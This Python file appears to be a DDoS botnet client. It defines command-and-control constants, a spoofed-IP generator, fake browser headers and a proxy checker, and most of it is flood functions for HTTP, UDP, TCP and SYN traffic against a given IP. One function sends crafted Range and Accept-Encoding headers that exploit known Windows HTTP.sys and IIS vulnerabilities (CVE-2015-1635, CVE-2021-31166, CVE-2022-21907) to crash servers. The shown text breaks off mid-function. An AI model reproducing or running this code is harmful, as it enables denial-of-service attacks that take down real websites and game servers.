import socket,requests,threading,time,string,cloudscraper,httpx,urllib.request,urllib3.request,base64,socks
import random,datetime
from random import choice as randchoice
import requests as fake_headers
from os import urandom as randbytes
from fake_headers import Headers
from fake_useragent import FakeUserAgent,UserAgent
import telnetlib

STOP_Constant_Increasing_rate_attack = False

hell_packet_head = ["GET","POST","PUT","PATCH","HEAD","OPTIONS","DELETE","AGE","CLOUDFLARE","DATE","SERVER","METHOD","HTTPHIT","DATA","PUSSY","CACHE","REFERER","BLOCK","VPN","URL","PROXY","READING","WAIT","OS","SETTING","MIRAI","RANSOMWARE","TCP","NTP","REMOVE","PACKET","INFECTION","HELL","GOLD","FTP","IMAP","RAP","MOM","GATEWAY","PHP","JNDI","CTX","LOCAL","USERNAME","HTML","RESOLVER","MCOT","RUBBER","RUNTIME","BOY","COP","COPYRIGHT","SONG","KB","MB","PUBIC","SPIN","POWER","GRE","HBOT","NIGHT","PAYLOAD","TRAFFIC","WIP","BETA","GO","BAO","REMOTE","UTF","RAINBOW","ARM","BACKROOM","LAYER","TOTAL","LOT","DISPLAY","GLOBALS","BYPASSFIX","NET","HATOKI","SUBNET","HTTPSYS","SMBGHOST","DENIAL","BSOD","AAAAAAAAAAAAAAAAA","AFINET","WORMABLE","BLEEPINGCOMPUTER","NULL","PREAUTN","PANOS","SNYK","AUTN","BIGIP","PINGOFDEATH","PYFLOODER","RANGE","TAWKUN","REQUESTS","GENERATES","TARGET","FORM","NEXT","DNS","HEADER","NONE"]

user_fake_list = []

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]

referers = [
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	"https://www.google.ad/search?q=",
	"https://www.google.ae/search?q=",
	"https://www.google.com.af/search?q=",
	"https://www.google.com.ag/search?q=",
	"https://www.google.com.ai/search?q=",
	"https://www.google.al/search?q=",
	"https://www.google.am/search?q=",
	"https://www.google.co.ao/search?q=",
]

Intn = random.randint
Choice = random.choice

def getuseragent_loader():
	platform = Choice(['Macintosh', 'Windows', 'X11'])
	if platform == 'Macintosh':
		os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
	elif platform == 'Windows':
		os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
	elif platform == 'X11':
		os  = Choice(['Linux i686', 'Linux x86_64'])
	browser = Choice(['chrome', 'firefox', 'ie'])
	if browser == 'chrome':
		webkit = str(Intn(500, 599))
		version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
		return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
	elif browser == 'firefox':
		currentYear = datetime.date.today().year
		year = str(Intn(2020, currentYear))
		month = Intn(1, 12)
		if month < 10:
			month = '0' + str(month)
		else:
			month = str(month)
		day = Intn(1, 30)
		if day < 10:
			day = '0' + str(day)
		else:
			day = str(day)
		gecko = year + month + day
		version = str(Intn(1, 72)) + '.0'
		return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
	elif browser == 'ie':
		version = str(Intn(1, 99)) + '.0'
		engine = str(Intn(1, 99)) + '.0'
		option = Choice([True, False])
		if option == True:
			token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
		else:
			token = ''
		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

def generate_url_path2():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 1))
    return data

def generate_url_path3():
    url_main = ""
    random_http = random.choice(("https://","http://","HTTPS://","HTTP://","FILE://"))
    random_http2 = random.choice(("www.","us.","uk.","ua.","support.","developer.","tls."))
    random_http3 = random.choice((".com",".or",".or.us",".or.uk",".or.ua",".xyz",".cat",".lol",".net",".eu"))
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(random.randint(1,35))))
    msg2 = str(string.ascii_letters + string.digits)
    data2 = "".join(random.sample(msg2, int(random.randint(1,35))))
    
    code_link = random.choice(("URL_MAIN0","URL_MAIN1","URL_MAIN2","URL_MAIN3","URL_MAIN4","URL_MAIN5","URL_MAIN6","URL_MAIN7"))

    if code_link in "URL_MAIN0":
        url_main = data
    elif code_link in "URL_MAIN1":
        url_main = random_http + data
    elif code_link in "URL_MAIN2":
        url_main = random_http + random_http2 + data
    elif code_link in "URL_MAIN3":
        url_main = random_http + random_http2 + data + random_http3
    elif code_link in "URL_MAIN4":
        url_main = data2
    elif code_link in "URL_MAIN5":
        url_main = random_http + data2
    elif code_link in "URL_MAIN6":
        url_main = random_http + random_http2 + data2
    elif code_link in "URL_MAIN7":
        url_main = random_http + random_http2 + data2 + random_http3
    return url_main

C2_ADDRESS  = "127.0.0.1"
C2_PORT     = 8080

def user_gen():
    ua = FakeUserAgent()
    data = ua.random
    return data

def user_gen2():
    ua = UserAgent()
    data = ua.random
    return data

def rand_ua(mode):
    if "FakeUser" in mode:
        ua = user_gen()
    else:
        ua = user_gen2()
    return ua

def check_prox(array,secs, url,methods):
	ip = requests.post("http://randomapi.rf.gd/api/ip.php").text
	for prox in array:
		thread_list = []
		t = threading.Thread (target=check, args=(ip, prox,secs, url,methods))
		thread_list.append(t)
		t.start()

def check(ip,prox,secs,url,methods):
    
    try:
        ipx = requests.get("http://randomapi.rf.gd/api/ip.php", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
    except:
        ipx = ip

    if ip != ipx:
        proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
        while time.time() < secs:
            
            for _ in range(1500):
                headers = Headers(headers=True).generate()
                t = threading.Thread(target=ddos_http_req, args=(url, headers, proxies,methods))
                t.start()

def ddos_http_req(ip, headers, proxies,method):
    scraper = cloudscraper.create_scraper()
    scraper = cloudscraper.CloudScraper()
    s = requests.Session()
    if "get" in method:
         for _ in range(1500):
            requests.get(ip,headers=headers, proxies=proxies)
            scraper.get(ip,headers=headers,proxies=proxies)
    elif "post" in method:
        for _ in range(1500):
            requests.post(ip,headers=headers, proxies=proxies)
            scraper.post(ip,headers=headers,proxies=proxies)
    elif "put" in method:
        for _ in range(1500):
            requests.put(ip,headers=headers, proxies=proxies)
            scraper.put(ip,headers=headers,proxies=proxies)
    elif "patch" in method:
        for _ in range(1500):
            requests.patch(ip,headers=headers, proxies=proxies)
            scraper.patch(ip,headers=headers,proxies=proxies)
    elif "delete" in method:
        for _ in range(1500):
            requests.delete(ip,headers=headers, proxies=proxies)
            scraper.delete(ip,headers=headers,proxies=proxies)
    elif "head" in method:
        for _ in range(1500):
            requests.head(ip,headers=headers, proxies=proxies)
            scraper.head(ip,headers=headers,proxies=proxies)
    elif "options" in method:
        for _ in range(1500):
            requests.options(ip,headers=headers, proxies=proxies)
            scraper.options(ip,headers=headers,proxies=proxies)
    elif "all" in method:
        for _ in range(1500):
            requests.get(ip,headers=headers, proxies=proxies)
            scraper.get(ip,headers=headers,proxies=proxies)
            requests.post(ip,headers=headers, proxies=proxies)
            scraper.post(ip,headers=headers,proxies=proxies)
            requests.put(ip,headers=headers, proxies=proxies)
            scraper.put(ip,headers=headers,proxies=proxies)
            requests.patch(ip,headers=headers, proxies=proxies)
            scraper.patch(ip,headers=headers,proxies=proxies)
            requests.delete(ip,headers=headers, proxies=proxies)
            scraper.delete(ip,headers=headers,proxies=proxies)
            requests.head(ip,headers=headers, proxies=proxies)
            scraper.head(ip,headers=headers,proxies=proxies)
            requests.options(ip,headers=headers, proxies=proxies)
            scraper.options(ip,headers=headers,proxies=proxies)

def pyflooder_hell_request(type_header,host,ip,port):
    url_path = generate_url_path()
    PATH = random.choice(('/','?','/?',''))
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((str(ip),int(port))) # http://51.159.30.249
        byt = (f"{type_header} {PATH}{url_path} HTTP/1.1\nHost: {host} \n\n").encode()
        print(byt)
        for _ in range(2500):
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
            s.send(byt)
    except:
        pass

def attack_wifi(ip, port,number_of_attack):

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(int(256))
    bytes2 = randbytes(int(256))

    send = base64.urlsafe_b64encode(bytes + bytes2)

    send2 = base64.b64encode(bytes + bytes2)

    send3 = base64.standard_b64encode(bytes + bytes2)

    send4 = base64.b16encode(bytes+bytes2)

    send5 = base64.b32encode(bytes+bytes2)

    send6 = base64.b32hexencode(bytes+bytes2)

    send7 = base64.b85encode(bytes+bytes2)

    for _ in range(int(number_of_attack)):
        try:
            s.sendto(b"\000" + send + send2 + send3 + send4 + send5 + send6 + send7 + bytes + bytes2,(ip, port))
        except:
            pass

def attack_udp_bypass(ip, port, secs, size):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        for _ in range(1500):
            data = randbytes(size)
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))

def attack_tcp_bypass(ip, port, secs, size):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                
                for _ in range(1500):
                    s.send(randbytes(size))
                    s.send(randbytes(size))
                    s.send(randbytes(size))
                    s.send(randbytes(size))
                    s.send(randbytes(size))
                    s.send(randbytes(size))
        except:
            pass
    
def attack_udp(ip, port, secs, size):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        for _ in range(1500):
            data = random._urandom(size)
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))

def attack_roblox(ip, port, secs, size):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        for _ in range(1500):

            bytes = random._urandom(size)

            ran = random.randrange(10**80)
            hex = "%064x" % ran
            hex = hex[:64] 

            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))
            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))
            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))
            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))
            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))
            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))

def attack_roblox2(ip, port, secs, size):

    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(size)
        dport = random.randint(1, 65535) if port == 0 else port
        for _ in range(1500):

            ran = random.randrange(10**80)
            hex = "%064x" % ran
            hex = hex[:64] 

            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))
            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))
            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))
            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))
            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))
            s.sendto(bytes.fromhex(hex) + bytes,(ip, dport))

def attack_wifi2(ip,port,number_of_attack):
    dos1 = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    try:
        byt_gen = randbytes(256) + random._urandom(256) # Reply from 192.168.1.1: Destination net unreachable.
        ran = random.randrange(10**80)
        hex = "%064x" % ran
        hex = hex[:64] 
        byt = byt_gen.fromhex(hex) + byt_gen
        for _ in range(int(number_of_attack)):
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
            dos1.sendto(byt,(ip,port))
    except:
        pass

def attack_tcp(ip, port, secs, size):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                
                for _ in range(1500):
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
        except:
            pass

def Attack_By_Cve_DOS1(url_send, mode):
    if "2021_31166" in mode:
        try:
            r = requests.get(url_send,headers={'Accept-Encoding': 'doar-e, ftw, imo, ,',})
        except:
            pass
    elif "2022_21907" in mode:
        try:
            r = requests.get(url_send,headers={'Accept-Encoding': 'AAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&AA&**AAAAAAAAAAAAAAAAAAAA**A,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAA,****************************AAAAAA, *, ,',},timeout=15)
        except:
            pass
    elif "2015_1635_1" in mode:
        try:
            r = requests.get(url_send,headers={'Range': 'bytes=0-1844674407370955161',})
            r = requests.get(url_send,headers={'Range': 'bytes=18-1844674407370955161',})
        except:
            pass
    elif "2015_1635_3" in mode:
        try:
            r = requests.get(url_send,headers={'Range': 'bytes=0-18446744073709551615',})
            r = requests.get(url_send,headers={'Range': 'bytes=18-18446744073709551615',})
        except:
            pass
    elif "2015_1635_5" in mode:
        try:
            r = requests.get(url_send,headers={'Range': f'bytes=0-{random.randint(0,18446744073709551615)}',})
            r = requests.get(url_send,headers={'Range': f'bytes=18-{random.randint(0,18446744073709551615)}',})
        except:
            pass
    elif "2015_1635_2" in mode:
        try:
            r = requests.get(url_send,headers={'Range': F'bytes={random.randint(0,999999999)}-1844674407370955161',})
        except:
            pass
    elif "2015_1635_4" in mode:
        try:
            r = requests.get(url_send,headers={'Range': f'bytes={random.randint(0,999999999)}-18446744073709551615',})
        except:
            pass
    elif "2015_1635_6" in mode:
        try:
            r = requests.get(url_send,headers={'Range': f'bytes={random.randint(0,999999999)}-{random.randint(0,18446744073709551615)}',})
        except:
            pass
    elif "HTTP.SYS" in mode:
        try:
            r = requests.get(url_send,headers={'Range': 'bytes=0-1844674407370955161',})
            r = requests.get(url_send,headers={'Range': 'bytes=18-1844674407370955161',})
            r = requests.get(url_send,headers={'Range': 'bytes=0-1844674407370955161',})
            r = requests.get(url_send,headers={'Range': 'bytes=18-1844674407370955161',})
            r = requests.get(url_send,headers={'Range': F'bytes={random.randint(0,999999999)}-1844674407370955161',})
            r = requests.get(url_send,headers={'Range': f'bytes={random.randint(0,999999999)}-18446744073709551615',})
            r = requests.get(url_send,headers={'Range': f'bytes=0-{random.randint(0,18446744073709551615)}',})
            r = requests.get(url_send,headers={'Range': f'bytes=18-{random.randint(0,18446744073709551615)}',})
            r = requests.get(url_send,headers={'Range': f'bytes={random.randint(0,999999999)}-{random.randint(0,18446744073709551615)}',})
            r = requests.get(url_send,headers={'Accept-Encoding': 'doar-e, ftw, imo, ,',})
            r = requests.get(url_send,headers={'Accept-Encoding': 'AAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&AA&**AAAAAAAAAAAAAAAAAAAA**A,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAA,****************************AAAAAA, *, ,',},timeout=15)
        except:
            pass

def no_data_send(ip,port):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        for _ in range(2500):
            s.connect((ip,port))
            s.send()
    except:
        try:
            s2 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            for _ in range(2500):
                s2.connect_ex((ip,port))
                s2.sendall()
        except:
            pass

def Constant_Increasing_rate_attack(ip,port):
    global STOP_Constant_Increasing_rate_attack
    while True:
        if STOP_Constant_Increasing_rate_attack == True:
            STOP_Constant_Increasing_rate_attack = False
            break
        dos = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            dos.connect((ip,port))
            for _ in range(int(2500)):
                dos.send(random._urandom(1314))
                dos.send(random._urandom(512))
                dos.send(random._urandom(250))
                dos.send(random._urandom(100))
        except:
            pass

def Constant_Increasing_rate_attack2(ip,port,secs):
    while time.time() < secs:
        dos = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            dos.connect((ip,port))
            for _ in range(int(2500)):
                dos.send(random._urandom(1314))
                dos.send(random._urandom(512))
                dos.send(random._urandom(250))
                dos.send(random._urandom(100))
        except:
            pass

def attack_multiply_data_tcp(ip,port,data_num,data_num2,data_multi,data_multi2):
    for _ in range(1500):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.setblocking(65536)
            s.connect((ip,port))
            s.send(randbytes(int(data_num)) * int(data_multi) + random._urandom(int(data_num2)) * int(data_multi2))
            s.close()
        except:
            pass

def attack_syn(ip, port, secs):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(0)
        try:
            dport = random.randint(1, 65535) if port == 0 else port
            s.connect((ip, dport)) # RST/ACK or SYN/ACK as response
            s.connect((ip, dport))
            s.connect((ip, dport))
            s.connect((ip, dport))
            s.connect((ip, dport))
            s.connect((ip, dport))
        except:
            pass

def attack_syn2(ip, port, secs):
    
    try:
        for _ in range(500):
            dport = random.randint(1, 65535) if port == 0 else port
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(65536)
            s.connect((ip, dport))
    except:
        pass

def attack_syn3(ip, port, secs):
    
    try:
        for _ in range(500):
            dport = random.randint(1, 65535) if port == 0 else port
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(65536)
            s.connect((ip, dport))
        s.close()
    except:
        pass

def attack_syn4(ip, port, secs):
    
    try:
        for _ in range(500):
            dport = random.randint(1, 65535) if port == 0 else port
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, dport))
            s.close()
    except:
        pass

def attack_cc3(ip, port, secs):
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        while time.time() < secs:
            
            for _ in range(1500):
                s.send("\000".encode())
                s.send("\000".encode())
                s.send("\000".encode())
                s.send("\000".encode())
                s.send("\000".encode())
                s.send("\000".encode())
                s.close()
    except:
        s.close()

def attack_cc4(ip,port):
    dos1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        dos1.connect((ip,port))
        byt = '\000'.encode()
        for _ in range(2500):
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.close()
    except:
        dos1.close()

def attack_cc(ip, port, secs):
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        while time.time() < secs:
            
            for _ in range(1500):
                s.send("\000".encode())
                s.send("\000".encode())
                s.send("\000".encode())
                s.send("\000".encode())
                s.send("\000".encode())
                s.send("\000".encode())
    except:
        pass

def attack_cc2(ip,port):
    dos1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        dos1.connect((ip,port))
        byt = '\000'.encode()
        for _ in range(2500):
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
            dos1.send(byt)
    except:
        pass

def attack_http(ip, secs):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, 5050))
            while time.time() < secs:
                
                url = generate_url_path()
                for _ in range(1500):
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("FakeUser")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("User")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("FakeUser")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("User")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("FakeUser")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("User")}\r\nConnection: keep-alive\r\n\r\n'.encode())
        except:
            s.close()

def attack_http2(ip, port, secs):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                
                url = generate_url_path()
                for _ in range(1500):
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("User")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("FakeUser")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("User")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("FakeUser")}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    s.send(f'GET /{url} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua("User")}\r\nConnection: keep-alive\r\n\r\n'.encode())
        except:
            s.close()

def attack_pyflooder(ip,host, port,type_attack): # .PYFLOODER http://51.159.30.249 80 1
    url_path = generate_url_path()
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        dos.connect((ip, port))

        byt = (f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
        dos.send(byt)
        for tread in range(500):
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            for tread in range(500):
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
        dos.send(byt)
        for tread in range(500):
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            for tread in range(500):
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
        dos.send(byt)
    except socket.error:
        pass
    finally:
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()

def custom_packet(ip,port,secs,payload):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(65536)
        s.connect_ex((ip,port))
        for _ in range(int(secs)):
            s.sendall(payload)
        s.close()
    except:
        pass

def custom_packet2(ip,port,secs,payload):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect_ex((ip,port))
        for _ in range(int(secs)):
            s.sendall(payload)
        s.close()
    except:
        pass

def attack_pyflooder2(ip,host, port,type_attack): # .PYFLOODER http://51.159.30.249 80 1
    url_path = generate_url_path2()
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        dos.connect((ip, port))

        byt = (f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
        dos.send(byt)
        for tread in range(500):
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            for tread in range(500):
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
